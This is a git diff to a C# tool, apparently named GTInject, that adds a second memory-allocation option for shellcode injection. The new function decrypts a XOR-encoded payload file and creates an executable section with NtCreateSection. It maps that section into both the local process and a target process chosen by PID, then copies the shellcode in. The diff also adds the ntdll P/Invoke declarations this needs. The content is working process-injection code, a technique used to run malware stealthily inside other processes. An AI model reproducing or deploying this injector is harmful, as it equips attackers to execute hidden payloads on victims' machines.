@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
+using System.Runtime.CompilerServices;
 
 namespace GTInject.memoryOptions
 {
@@ -12,11 +13,12 @@ namespace GTInject.memoryOptions
             {
                 case 1:
                     return memopt1(binsrctype, binsrcpath, xorkey, pid);
-                    break;
                 case 2:
+                    return memopt2(binsrctype, binsrcpath, xorkey, pid);
+                case 3:
                     return (IntPtr.Zero, null);
-                    break;
             }
+            Console.WriteLine(  " [-] Bad memory allocation technique, enter an integer Memory Option selection");
             return (IntPtr.Zero, null);
         }
         private static (IntPtr, Process) memopt1(string binLocation, string bytePath, string xorkey, int ProcID)
@@ -51,6 +53,51 @@ namespace GTInject.memoryOptions
         }
 
 
+        private static (IntPtr, Process) memopt2(string binLocation, string bytePath, string xorkey, int ProcID)
+        {
+            // //  GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID
+            /////////////////////////////////////
+            // OPTION 2 == NtCreateSection, NtMapViewOfSection, RtlCopyMemory (NTAPI)
+            /////////////////////////////////////
+            // https://github.com/tasox/CSharp_Process_Injection/blob/main/04.%20Process_Injection_template_(Low%20Level%20Windows%20API)%20-%20Modify%20Permissions/Program.cs 
+            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);
+
+            int len = plainBytes.Length;
+            uint bufferLength = (uint)len;
+            IntPtr sectionHandler = new IntPtr();
+            long createSection = (int)NtCreateSection(ref sectionHandler, (uint)(NtSectionPerms.SECTION_MAP_READ | NtSectionPerms.SECTION_MAP_WRITE | NtSectionPerms.SECTION_MAP_EXECUTE), IntPtr.Zero, ref bufferLength, (uint)(MemoryProtection.ExecuteReadWrite), (uint)(AllocationType.Commit), IntPtr.Zero);
+
+
+            // Map the new section for the LOCAL process.
+            IntPtr localBaseAddress = new IntPtr();
+            int sizeLocal = 4096;
+            ulong offsetSectionLocal = new ulong();
+
+            Process localProc = Process.GetCurrentProcess();
+            long mapSectionLocal = NtMapViewOfSection(sectionHandler, localProc.Handle, ref localBaseAddress, IntPtr.Zero, IntPtr.Zero, out offsetSectionLocal, out sizeLocal, 2, 0, (uint)(NtSectionPerms.SECTION_MAP_READ | NtSectionPerms.SECTION_MAP_WRITE));
+
+
+            // Map the new section for the REMOTE process.
+            IntPtr remoteBaseAddress = new IntPtr();
+            int sizeRemote = 4096;
+            ulong offsetSectionRemote = new ulong();
+
+            Process remoteProc = Process.GetProcessById(ProcID);
+
+            long mapSectionRemote = NtMapViewOfSection(sectionHandler, remoteProc.Handle, ref remoteBaseAddress, IntPtr.Zero, IntPtr.Zero, out offsetSectionRemote, out sizeRemote, 2, 0, (uint)(MemoryProtection.ExecuteRead));
+
+            // RtlCopyMemory takes an IntPtr, take our Byte array into a newly allocated unmanaged pointer temporarily
+            IntPtr unmanagedPointer = Marshal.AllocHGlobal(plainBytes.Length);
+            Marshal.Copy(plainBytes, 0, unmanagedPointer, plainBytes.Length);
+            RtlCopyMemory(localBaseAddress, unmanagedPointer, (uint)plainBytes.Length);
+            Marshal.FreeHGlobal(unmanagedPointer);
+
+            return (remoteBaseAddress, remoteProc);
+
+
+        }
+
+
         /////////////////////////////////////
         // Supporting functions
         /////////////////////////////////////
@@ -61,9 +108,13 @@ namespace GTInject.memoryOptions
         // PInvokes and Enums / Structures
         /////////////////////////////////////
 
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
-
+        [Flags]
+        public enum NtSectionPerms
+        {
+            SECTION_MAP_READ = 0x0004,
+            SECTION_MAP_WRITE = 0x0002,
+            SECTION_MAP_EXECUTE = 0x0008
+        }
         [Flags]
         public enum AllocationType
         {
@@ -94,9 +145,17 @@ namespace GTInject.memoryOptions
             WriteCombineModifierflag = 0x400
         }
 
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
+
         [DllImport("kernel32.dll")]
         public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
 
-
+        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
+        static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);
+        [DllImport("ntdll.dll", SetLastError = true)]
+        static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, out ulong SectionOffset, out int ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);
+        [DllImport("ntdll.dll", SetLastError = true)]
+        private static extern void RtlCopyMemory(IntPtr dest, IntPtr src, uint length);
     }
 }
